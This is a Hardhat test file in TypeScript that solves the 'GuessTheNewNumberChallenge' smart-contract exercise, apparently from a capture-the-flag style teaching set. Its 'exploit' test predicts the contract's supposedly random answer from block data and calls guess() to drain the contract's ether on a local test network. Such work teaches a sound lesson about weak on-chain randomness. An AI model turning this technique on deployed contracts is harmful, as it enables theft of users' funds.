import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);
  });

  it('exploit', async () => {
        const blockNumber = await ethers.provider.getBlockNumber();
    const timestamp = (await ethers.provider.getBlock(blockNumber)).timestamp+1;
    const hash = (await ethers.provider.getBlock(blockNumber)).hash;
    const generatedAnswer = ethers.utils.solidityKeccak256(
      ["bytes32", "uint256"],
      [hash, timestamp]
    );
    const hexString = generatedAnswer[generatedAnswer.length - 2] + generatedAnswer[generatedAnswer.length - 1];
    const uint8 = parseInt(hexString,16);
    await target.guess(uint8,{value:ethers.utils.parseEther('1')});
    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
